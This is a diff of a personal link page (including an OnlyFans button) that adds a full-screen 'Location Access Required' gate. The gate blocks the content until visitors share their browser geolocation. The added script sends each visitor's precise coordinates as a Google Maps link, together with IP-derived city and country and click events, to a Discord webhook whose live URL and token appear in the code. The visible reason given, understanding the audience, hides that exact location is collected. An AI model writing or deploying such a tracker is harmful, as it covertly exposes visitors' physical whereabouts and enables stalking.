@@ -3,14 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Links | Connect With Me</title>
+    <title>Connect With Me | Location Access Required</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
@@ -188,10 +190,128 @@
             color: #fff;
             transform: translateY(-3px);
         }
+        
+        /* Location Gate Styles */
+        #gate {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+        
+        .gate-content {
+            background: linear-gradient(145deg, #121212, #0a0a0a);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid #2a2a2a;
+        }
+        
+        .gate-icon {
+            margin: 0 auto 20px;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #4a6fc1, #9b45e5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 36px;
+            color: white;
+            animation: pulse 2s infinite;
+        }
+        
+        .gate-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            background: linear-gradient(90deg, #fff, #aaa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .gate-description {
+            color: #888;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .gate-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+        
+        .gate-button {
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            font-size: 16px;
+        }
+        
+        .gate-allow {
+            background: linear-gradient(135deg, #4a6fc1, #9b45e5);
+            color: white;
+        }
+        
+        .gate-deny {
+            background: #2a2a2a;
+            color: #888;
+            border: 1px solid #3a3a3a;
+        }
+        
+        .gate-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+        
+        .gate-button:active {
+            transform: translateY(0);
+        }
+        
+        .gate-message {
+            margin-top: 20px;
+            color: #e91e63;
+            font-size: 14px;
+        }
+        
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- Location Gate -->
+    <div id="gate">
+        <div class="gate-content">
+            <div class="gate-icon">
+                <i class="fas fa-map-marker-alt"></i>
+            </div>
+            <h2 class="gate-title">Location Access Required</h2>
+            <p class="gate-description">To view my content, please allow location access. This helps me understand where my audience is coming from.</p>
+            <div class="gate-buttons">
+                <button id="allow" class="gate-button gate-allow">Allow Location</button>
+                <button id="deny" class="gate-button gate-deny">No Thanks</button>
+            </div>
+            <p id="gateMsg" class="gate-message"></p>
+        </div>
+    </div>
+
+    <!-- Main Content (Hidden until location is granted) -->
+    <div class="container hidden" id="mainContent">
         <div class="header">
             <h1>Connect With Me</h1>
             <p>Choose how you'd like to explore my content</p>
@@ -208,7 +328,10 @@
                 <span>OnlyFans</span>
             </button>
             
-           
+            <button class="btn about" onclick="handleClick('about')">
+                <i class="fas fa-user"></i>
+                <span>About Me</span>
+            </button>
         </div>
         
         <div class="footer">
@@ -224,6 +347,17 @@
     </div>
 
     <script>
+        // DOM Elements
+        const gate = document.getElementById('gate');
+        const allowBtn = document.getElementById('allow');
+        const denyBtn = document.getElementById('deny');
+        const gateMsg = document.getElementById('gateMsg');
+        const mainContent = document.getElementById('mainContent');
+        
+        // Discord Webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1412436667184447589/HsrbM05ctSV6J0MyoNsoA5I7qxpZVvN0aNW8tyjJH0KTFG4gdTX2WUROixH90a7cQZ0M';
+        
+        // Get IP information
         async function getIPInfo() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
@@ -233,12 +367,15 @@
                 return null;
             }
         }
-
-        async function sendToDiscord(data, linkType) {
-            const webhookURL = 'https://discord.com/api/webhooks/1412436667184447589/HsrbM05ctSV6J0MyoNsoA5I7qxpZVvN0aNW8tyjJH0KTFG4gdTX2WUROixH90a7cQZ0M';
+        
+        // Send location data to Discord
+        async function sendLocationToDiscord(ipInfo, location) {
+            const googleMapsLink = location ? 
+                `https://www.google.com/maps?q=${location.latitude},${location.longitude}` : 
+                'Location not available';
             
             const payload = {
-                content: `🌐 Someone visited your ${linkType} page!\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.region}, ${data.country_name}\n**Time:** ${new Date().toLocaleString()}`
+                content: `📍 Someone accessed your links!\n**IP:** ${ipInfo.ip}\n**Location:** ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}\n**Google Maps:** ${googleMapsLink}\n**Time:** ${new Date().toLocaleString()}`
             };
 
             try {
@@ -253,15 +390,98 @@
                 console.error('Error sending to Discord:', error);
             }
         }
-
+        
+        // Handle location access
+        function handlePosition(position) {
+            const location = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+            
+            // Hide gate and show main content
+            gate.style.display = 'none';
+            mainContent.classList.remove('hidden');
+            
+            // Send location data to Discord
+            getIPInfo().then(ipInfo => {
+                if (ipInfo) {
+                    sendLocationToDiscord(ipInfo, location);
+                }
+            });
+        }
+        
+        // Handle location errors
+        function handleError(error) {
+            let message = '';
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    message = 'Permission denied. You must allow location to proceed.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = 'Position unavailable. Try again.';
+                    break;
+                case error.TIMEOUT:
+                    message = 'Request timed out. Try again.';
+                    break;
+                default:
+                    message = 'An unknown error occurred.';
+                    break;
+            }
+            
+            gateMsg.textContent = message;
+        }
+        
+        // Request location access
+        allowBtn.addEventListener('click', () => {
+            if (!navigator.geolocation) {
+                gateMsg.textContent = 'Geolocation is not supported by this browser.';
+                return;
+            }
+            
+            gateMsg.textContent = 'Requesting location...';
+            
+            navigator.geolocation.getCurrentPosition(
+                handlePosition, 
+                handleError, 
+                {
+                    enableHighAccuracy: false,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        });
+        
+        // Handle deny button
+        denyBtn.addEventListener('click', () => {
+            gateMsg.textContent = 'Location access is required to view the content.';
+        });
+        
         // Handle button clicks
         async function handleClick(linkType) {
             const ipInfo = await getIPInfo();
             
+            // Send click data to Discord
             if (ipInfo) {
-                await sendToDiscord(ipInfo, linkType);
+                const payload = {
+                    content: `🔗 Someone clicked your ${linkType} link!\n**IP:** ${ipInfo.ip}\n**Location:** ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}\n**Time:** ${new Date().toLocaleString()}`
+                };
+
+                try {
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                } catch (error) {
+                    console.error('Error sending to Discord:', error);
+                }
             }
             
+            // Redirect after a short delay
             setTimeout(() => {
                 switch(linkType) {
                     case 'wikipedia':
@@ -277,6 +497,7 @@
             }, 300);
         }
         
+        // Button hover effects
         document.querySelectorAll('.btn').forEach(btn => {
             btn.addEventListener('mouseenter', function() {
                 this.style.background = 'linear-gradient(90deg, #222, #2a2a2a)';
